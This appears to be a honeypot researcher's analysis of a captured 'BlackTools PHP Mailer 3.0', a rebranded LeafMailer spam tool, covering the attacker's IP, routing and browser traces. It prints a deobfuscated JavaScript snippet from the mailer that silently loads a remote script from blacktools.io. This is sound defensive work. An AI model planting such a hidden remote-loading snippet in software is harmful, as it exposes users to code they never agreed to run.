# BlackTools PHP Mailer, version 3.0

A rebranded LeafMailer web email tool.

## Origin

### Download

Apparently, the attacker(s) thought they were downloading to a WSO web shell.
My WordPress honey pot has a fairly full-featured WSO imitation,
so instead of a "FilesMAn"/"uploadFile" file transfer,
it ended up in my honey pot instead of as a file named `blacktools.php`

This download is actually part of a larger [campaign](CAMPAIGN.md).

### IP Address 5.155.21.37

No reverse lookup for 5.155.21.37,
but `p0f3` has "Linux 2.2.x-3.x (no timestamps)" running that IP address.

`whois` says that IP address comes from Damascus, Syria.
I'm flattered. They're having a horrible war there.

    inetnum:        5.155.0.0 - 5.155.127.255
    netname:        SY-ISP-TARASSUL
    descr:          Tarassul inetnet Service Provider
    country:        SY

The `traceroute` seems weird.
I got different routes on different days of checking.

On 2018-10-17, 
the traceoute went through Hurricane Electric routers.
The last two IP addresses that respond are:

7. TenGE0-1-0-13.br02.ath01.pccwbtn.net (63.218.172.249)
8. cyprus.te7-8.br03.ldn01.pccwbtn.net (63.218.34.58)

`geoiplookup` says those are in the USA, despite the "cyprus"
in the host name.
"pccwbtn.net" is a GoDaddy domain, although it appears to
be associated with PCCW Global (pccwglobal.com),
a mysterious "global service provider" out of Herndon, VA,
which runs AS3491.
63.218.172.249 and 63.218.34.58 are both in AS3491.
PCCW Global's website is pretty generic, I don't know what to think of it.

On 2018-10-19,
the traceroute went through Cogent routers.
The last two IP addreses that respond are:

15.  cyta.demarc.cogentco.com (149.14.126.34)
16.  depkapsalos-li-cust.cytanet.net (195.14.150.57)

cytanet.net apparently is a Cyprus company, although the 
domain name is registered as a NetworkSolutions domain.
`geoiplookup` has the 195.14.150.57 address in Cyprus.
cytanet.net is apparently Cyprus Telecommuncations Authority.

The [Ugarit submarine cable](https://www.submarinecablemap.com/#/submarine-cable/ugarit),
owned by CYTA,
runs from Pentaskhinos, Cyprus to Tartous, Syria.
This is on the Greek side of Cyprus,
CYTA appears to be a Greek-Cypriot thing.
The northern, Turkish, side has 2 cables that run to mainland Turkey.

Whatever browser the attacker(s) used sent "ar,en-US;q=0.9,en;q=0.8,cs;q=0.7"
as languages they accept. The "ar" arabic would seem to jibe with a Syrian attack.

The User Agent string "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
indicates the attackers used something other than Linux 2.2.x-3.x.

## Analysis

No deobfucation necessary: it was a cleartext download.

Blacktools PHP Mailer 3.0 is a copy of [LeafMailer 2.7](../leafmailer)
with a lot more comments, probably because blacktools didn't feel
confident stripping them out.
Blacktools PHP Mailer does not have the phone-home
that came with my honey pot's copy of LeafMailer.

There is one [small piece of JavaScript](added_javascript)
added to Blacktools PHP Mailer.
When deobfuscated it looks like this:


    var _0xd00f=[
        "<script src=https://blacktools.io/images/Style.js></script>",
        "write"
    ];
    document[_0xd00f[1]](_0xd00f[0]);

Looks like this retrieves `Style.js` from blacktools.io,
and injects it into the HTML document.
It's possible that this is just CSS, it's possible it does something wicked,
and it's possible that blacktools uses download attempts as some kind of
installation tracker or counter. Or it could be something else.

That URL just gave me 404 File Not Found, but blacktools.io did send a cookie:

    __cfd=d956ef21ccf682ffd597a380c93b85 

I tried `wget`, `wget` with a User Agent, and `lynx`, all earned me 404s.

### blacktools.io

The code claims that its website is blacktools.io.

    Address: 104.27.171.124
    Address: 104.27.170.124
    Address: 2606:4700:30::681b:ab7c
    Address: 2606:4700:30::681b:aa7c

That's a namecheap domain name.
The IP addresses are CloudFlare cover-ups.

blacktools.io seems like a place to download script-kiddie tools:
